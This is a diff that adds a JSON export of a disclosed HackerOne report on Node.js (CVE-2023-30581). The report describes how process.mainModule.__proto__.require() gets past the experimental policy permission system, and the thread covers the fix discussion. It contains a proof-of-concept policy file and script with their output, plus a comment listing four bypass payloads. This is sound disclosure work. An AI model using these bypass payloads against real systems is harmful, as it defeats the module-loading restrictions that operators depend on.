@@ -1,0 +1,454 @@
+{
+    "id": 1877919,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODc3OTE5",
+    "url": "https://hackerone.com/reports/1877919",
+    "title": "The use of __proto__ in process.mainModule.__proto__.require() bypasses the permission system in Node v19.6.1",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "high",
+    "readable_substate": "Resolved",
+    "created_at": "2023-02-17T17:58:20.095Z",
+    "submitted_at": "2023-02-17T17:58:20.197Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "haxatron1",
+        "url": "/haxatron1",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 22984,
+        "url": "https://hackerone.com/nodejs",
+        "handle": "nodejs",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Node.js",
+            "twitter_handle": "nodejs",
+            "website": "https://nodejs.org",
+            "about": "The Node.js JavaScript Runtime"
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [
+        "CVE-2023-30581"
+    ],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2023-07-20T20:55:30.392Z",
+    "bug_reporter_agreed_on_going_public_at": null,
+    "team_member_agreed_on_going_public_at": "2023-06-20T20:55:29.759Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "process.mainModule.require() correctly works with permission system in Node v19.6.1. \nBut the use of \\_\\_proto\\_\\_  in process.mainModule.\\_\\_proto\\_\\_.require() can bypass the check.\n\n# Description and STR\nConsider the following policy.json:\n`````\n{\n  \"resources\": {\n    \"./proc.js\": {\n      \"integrity\": true\n    }\n  }\n}\n`````\nThe policy only allows proc.js file to be loaded without any dependencies.\n\nHowever with the following proc.js\n`````\nconst os = process.mainModule.__proto__.require(\"os\")\n\nconsole.log(process.version)\nconsole.log(os.version())\n`````\nWe get the output:\n`````\n└─$ ../node-v19.6.1-linux-x64/bin/node --experimental-policy=policy.json proc.js\nv19.6.1\n#1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01)\n(node:2720) ExperimentalWarning: Policies are experimental.\n(Use `node --trace-warnings ...` to show where the warning was created)\n`````\nTherefore os dependency can be loaded and os.version executed even if unspecified in permission system.\n\n## Impact\n\nBypass the permission system",
+    "weakness": {
+        "id": 75,
+        "name": "Privilege Escalation"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [],
+    "allow_singular_disclosure_at": "2023-07-20T20:55:29.866Z",
+    "allow_singular_disclosure_after": -3408634.226636609,
+    "singular_disclosure_allowed": true,
+    "vote_count": 5,
+    "voters": [
+        "zy9ard3",
+        "trib0rg",
+        "salman_hunted",
+        "enterprisetaco",
+        "amaru-poole"
+    ],
+    "severity": {
+        "rating": "high",
+        "score": 8.4,
+        "author_type": "User",
+        "metrics": {
+            "attack_vector": "local",
+            "attack_complexity": "low",
+            "privileges_required": "none",
+            "user_interaction": "none",
+            "scope": "unchanged",
+            "confidentiality": "high",
+            "integrity": "high",
+            "availability": "high"
+        }
+    },
+    "structured_scope": {
+        "databaseId": 666,
+        "asset_type": "SOURCE_CODE",
+        "asset_identifier": "https://github.com/nodejs/node",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 20468345,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "This is a bypass of https://nodejs.org/en/blog/vulnerability/february-2023-security-releases/#node-js-permissions-policies-can-be-bypassed-via-process-mainmodule-high-cve-2023-23918",
+            "automated_response": false,
+            "created_at": "2023-02-18T15:15:48.409Z",
+            "updated_at": "2023-02-18T15:15:48.409Z",
+            "actor": {
+                "username": "haxatron1",
+                "cleared": false,
+                "verified": false,
+                "url": "/haxatron1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs"
+        },
+        {
+            "id": 20469083,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Suggested Fix:\n````````\ndiff --git a/lib/internal/modules/cjs/loader.js b/lib/internal/modules/cjs/loader.js\nindex 8d602df88a..0dd779c53b 100644\n--- a/lib/internal/modules/cjs/loader.js\n+++ b/lib/internal/modules/cjs/loader.js\n@@ -230,7 +230,7 @@ function Module(id = '', parent) {\n     const moduleURL = pathToFileURL(id);\n     redirects = manifest.getDependencyMapper(moduleURL);\n     // TODO(rafaelgss): remove the necessity of this branch\n-    setOwnProperty(this, 'require', makeRequireFunction(this, redirects));\n+    this.__proto__.require = makeRequireFunction(this, redirects);\n   }\n   this[require_private_symbol] = internalRequire;\n }\n````````\nI tested it and it works",
+            "automated_response": false,
+            "created_at": "2023-02-18T18:51:37.183Z",
+            "updated_at": "2023-02-18T18:51:37.183Z",
+            "actor": {
+                "username": "haxatron1",
+                "cleared": false,
+                "verified": false,
+                "url": "/haxatron1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs"
+        },
+        {
+            "id": 20472761,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I realised the above patch breaks the object-define bypass test. I think the solution should be that if a policy manifest is detected, then Module.prototype.require should be set to null as each individual module should already have its own version of require via the setOwnProperty call https://github.com/nodejs/node/blob/main/lib/internal/modules/cjs/loader.js#L233. I have updated the suggested patch to rectify this. Now when accessing process.mainModule.\\_\\_proto\\_\\_.require when using policy manifest it is null instead of the old vulnerable require() function\n\nThe side effect is that the object-define-bypass test now throws an error of mod.require not being defined instead of exiting on process.exit(1). But I think that it is fine as it seems to be a test for an exploit rather than a test for feature \n\nAttached is suggest patch + unit tests.",
+            "automated_response": false,
+            "created_at": "2023-02-19T08:37:55.615Z",
+            "updated_at": "2023-02-19T08:37:55.615Z",
+            "actor": {
+                "username": "haxatron1",
+                "cleared": false,
+                "verified": false,
+                "url": "/haxatron1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 2183321,
+                    "filename": "main-module-proto-bypass.patch",
+                    "type": "text/x-diff",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/s1jtlnnwxa58ixligbr082h39g0f?response-content-disposition=attachment%3B%20filename%3D%22main-module-proto-bypass.patch%22%3B%20filename%2A%3DUTF-8%27%27main-module-proto-bypass.patch&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRZXXXBVF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T074604Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGIRenCSrfPcgTzSaO8QX26B9paJvvasIMLYRmcGzR1cAiBjFJbPsOh%2Bik2kOVW9ts7HvOwRMYnKfesm5Nr%2BufbNjSq6BQif%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMsePPIpSJgdLj%2FGf1Ko4FqUJrhAMTg0ZIyb%2B1aVR%2FG44A2mOWZ6x6vGGcep4SvdMaIalmDAmh2pt6So6Qy6pOK2n939v4zbyM6seXirKyRXHKw3iQWhNjJuaJXlE%2FHpe8gmE3e2QADfkOI3u9bV1ho7yEPZHObU5ZkaCwbi3Is6ImJkL6vs5%2F4gEiKto44SQ1kryLDSiuArhEXZm3namcAI5Cjv0xN6eu3QFAwj26WQudVPnFodb9J2UU%2BNY62kiYfZwCkdUYNCV3h3WO77dhZEOKF7EVU2zEwT6i3iwfTz%2FuYPJii%2Bj5JLVrGySxCqLuu7dmgYLq3whyU6X8PjOFtZBZEAQZqoJikhB8g%2BEOp1A6ftYalZsJZFufaQH3B63suBHFinWrFMw%2FCCWa9eHCl%2BvLuhqDl1SvtrU5%2FxQ2fOB3XGBONTD%2B7q0ErqKRM8dzbyvym3KfNnlCZgsbpNp8yTkuBi4eos5SilEGPcT9n6ouE5N9DXS43l4YybpYIky11BVuk2UWkfEK3dJQnhFHIhOYMavdPRSa7lmdi2kEnxCTOXdkGUH%2FKAGLNRsYfow9oEoy4YZGB0FoX8Eq%2B08e452Whmi1JpkJiIRgenUwOU%2B87HWCJrJf%2BS0MSQDs5iILTtYS5iFbalf2GVWwSWLgfVrXYuasVIFmEyHP8cTyFTVVPWf7FbGzfvp2BXB%2BogUB2swB7y6hxqQQu0KsPAmJA4sEdO85nj80PQJYTchcTvnWpMZN1bO5y6Oa4j8pxE08cwvACkQ9eBEhdppZSTKhqiv6TYPjMrRiojGlm2WUIOpmXmZDBKwNL6CzTXZdt%2B2d3t8MhZGBnzal2u85ZD2a4VfqP%2BIWfF4PUlDbjBFrFINI07I%2BobnCRgS0mEUuMJubtqcGOrIBqq44iCmenp9XE9yUHVBdv6l%2BN3SN3TDA8%2BUOBKb0BjOOfC5%2F8dCdNYNF5%2B1thGdyGBRX0juTvEz1KUixIrQ38a2zYJ9WpJoFs%2BFZvOxXJIyeou8u5PXPnplCwDvyxlLqF78G8s7SPGknl0RozlWjJuX%2B7qWoaqc41gdx%2FiYArbSOEB1N32UD3yAr4%2Fn4%2BUBFO41EsEWEoOZ6cTRB3vEOpPx39KopEbOmfSAZ0iPUbZ6J1g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d8da69c54f478770a654f886a3a26fee236117b068e452975a19cd692c0beb85"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "nodejs"
+        },
+        {
+            "id": 20473016,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks for reporting! We will take a look in the next few days, all the security team is resting after last week security release.",
+            "automated_response": false,
+            "created_at": "2023-02-19T08:56:16.159Z",
+            "updated_at": "2023-02-19T08:56:16.159Z",
+            "actor": {
+                "username": "mcollina",
+                "cleared": false,
+                "verified": false,
+                "url": "/mcollina",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs"
+        },
+        {
+            "id": 20543088,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "I could reproduce it locally. Confirmed for v14, v16, v18, and v19.",
+            "automated_response": false,
+            "created_at": "2023-02-23T16:48:18.434Z",
+            "updated_at": "2023-02-23T16:48:18.434Z",
+            "actor": {
+                "username": "rafaelgss",
+                "cleared": false,
+                "verified": false,
+                "url": "/rafaelgss",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs"
+        },
+        {
+            "id": 22079113,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "This patch seems to solve the issue. @haxatron1 could you please validate? {F2382091}",
+            "automated_response": false,
+            "created_at": "2023-05-29T19:54:29.188Z",
+            "updated_at": "2023-05-29T19:54:29.188Z",
+            "actor": {
+                "username": "rafaelgss",
+                "cleared": false,
+                "verified": false,
+                "url": "/rafaelgss",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 2382091,
+                    "filename": "policy-patch.diff",
+                    "type": "application/mbox",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rhxhgadx9fv0rnzjues9kcqit5vu?response-content-disposition=attachment%3B%20filename%3D%22policy-patch.diff%22%3B%20filename%2A%3DUTF-8%27%27policy-patch.diff&response-content-type=application%2Fmbox&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRZXXXBVF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T074604Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGIRenCSrfPcgTzSaO8QX26B9paJvvasIMLYRmcGzR1cAiBjFJbPsOh%2Bik2kOVW9ts7HvOwRMYnKfesm5Nr%2BufbNjSq6BQif%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMsePPIpSJgdLj%2FGf1Ko4FqUJrhAMTg0ZIyb%2B1aVR%2FG44A2mOWZ6x6vGGcep4SvdMaIalmDAmh2pt6So6Qy6pOK2n939v4zbyM6seXirKyRXHKw3iQWhNjJuaJXlE%2FHpe8gmE3e2QADfkOI3u9bV1ho7yEPZHObU5ZkaCwbi3Is6ImJkL6vs5%2F4gEiKto44SQ1kryLDSiuArhEXZm3namcAI5Cjv0xN6eu3QFAwj26WQudVPnFodb9J2UU%2BNY62kiYfZwCkdUYNCV3h3WO77dhZEOKF7EVU2zEwT6i3iwfTz%2FuYPJii%2Bj5JLVrGySxCqLuu7dmgYLq3whyU6X8PjOFtZBZEAQZqoJikhB8g%2BEOp1A6ftYalZsJZFufaQH3B63suBHFinWrFMw%2FCCWa9eHCl%2BvLuhqDl1SvtrU5%2FxQ2fOB3XGBONTD%2B7q0ErqKRM8dzbyvym3KfNnlCZgsbpNp8yTkuBi4eos5SilEGPcT9n6ouE5N9DXS43l4YybpYIky11BVuk2UWkfEK3dJQnhFHIhOYMavdPRSa7lmdi2kEnxCTOXdkGUH%2FKAGLNRsYfow9oEoy4YZGB0FoX8Eq%2B08e452Whmi1JpkJiIRgenUwOU%2B87HWCJrJf%2BS0MSQDs5iILTtYS5iFbalf2GVWwSWLgfVrXYuasVIFmEyHP8cTyFTVVPWf7FbGzfvp2BXB%2BogUB2swB7y6hxqQQu0KsPAmJA4sEdO85nj80PQJYTchcTvnWpMZN1bO5y6Oa4j8pxE08cwvACkQ9eBEhdppZSTKhqiv6TYPjMrRiojGlm2WUIOpmXmZDBKwNL6CzTXZdt%2B2d3t8MhZGBnzal2u85ZD2a4VfqP%2BIWfF4PUlDbjBFrFINI07I%2BobnCRgS0mEUuMJubtqcGOrIBqq44iCmenp9XE9yUHVBdv6l%2BN3SN3TDA8%2BUOBKb0BjOOfC5%2F8dCdNYNF5%2B1thGdyGBRX0juTvEz1KUixIrQ38a2zYJ9WpJoFs%2BFZvOxXJIyeou8u5PXPnplCwDvyxlLqF78G8s7SPGknl0RozlWjJuX%2B7qWoaqc41gdx%2FiYArbSOEB1N32UD3yAr4%2Fn4%2BUBFO41EsEWEoOZ6cTRB3vEOpPx39KopEbOmfSAZ0iPUbZ6J1g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c9ea4b9eac261cf6b519d97cf0f4b5d6ade2fe0425a75430fceb3541200616de"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "nodejs"
+        },
+        {
+            "id": 22081998,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@rafaelgss I applied the patch locally and also tried the following payloads\n`````\nprocess.mainModule.__proto__.require('os')\nprocess.mainModule.constructor.prototype.require('os')\nmodule.__proto__.require('os')\nmodule.constructor.prototype.require('os')\n`````\nI can confirm it fixes the issue.",
+            "automated_response": false,
+            "created_at": "2023-05-30T03:59:46.385Z",
+            "updated_at": "2023-05-30T03:59:46.385Z",
+            "actor": {
+                "username": "haxatron1",
+                "cleared": false,
+                "verified": false,
+                "url": "/haxatron1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs"
+        },
+        {
+            "id": 22309296,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::CveIdAdded",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2023-06-12T17:50:56.988Z",
+            "updated_at": "2023-06-12T17:50:56.988Z",
+            "cve_ids": [
+                "CVE-2023-30581"
+            ],
+            "actor": {
+                "username": "rafaelgss",
+                "cleared": false,
+                "verified": false,
+                "url": "/rafaelgss",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs"
+        },
+        {
+            "id": 22349246,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @haxatron1! Would you like to be credited in the release notes? If yes, which name would you like us to use?\n\nExample:\n\nThanks, to haxatron1 for reporting this vulnerability.",
+            "automated_response": false,
+            "created_at": "2023-06-14T19:16:20.926Z",
+            "updated_at": "2023-06-14T19:16:20.926Z",
+            "actor": {
+                "username": "rafaelgss",
+                "cleared": false,
+                "verified": false,
+                "url": "/rafaelgss",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs"
+        },
+        {
+            "id": 22353080,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi, pls use \n\n\"Thanks, to Axel Chong for reporting this vulnerability\" \n\nThanks!",
+            "automated_response": false,
+            "created_at": "2023-06-14T23:03:51.693Z",
+            "updated_at": "2023-06-14T23:03:51.693Z",
+            "actor": {
+                "username": "haxatron1",
+                "cleared": false,
+                "verified": false,
+                "url": "/haxatron1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs"
+        },
+        {
+            "id": 22436168,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2023-06-20T20:55:10.482Z",
+            "updated_at": "2023-06-20T20:55:10.482Z",
+            "actor": {
+                "username": "rafaelgss",
+                "cleared": false,
+                "verified": false,
+                "url": "/rafaelgss",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "haxatron1",
+                "url": "/haxatron1"
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs"
+        },
+        {
+            "id": 22436169,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2023-06-20T20:55:29.811Z",
+            "updated_at": "2023-06-20T20:55:29.811Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "rafaelgss",
+                "cleared": false,
+                "verified": false,
+                "url": "/rafaelgss",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/kjrbv0uq2i8ccibs0uuw51m04586/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs"
+        },
+        {
+            "id": 22932864,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2023-07-20T20:55:30.511Z",
+            "updated_at": "2023-07-20T20:55:30.511Z",
+            "actor": {
+                "url": "/nodejs",
+                "ibb": true,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Node.js"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
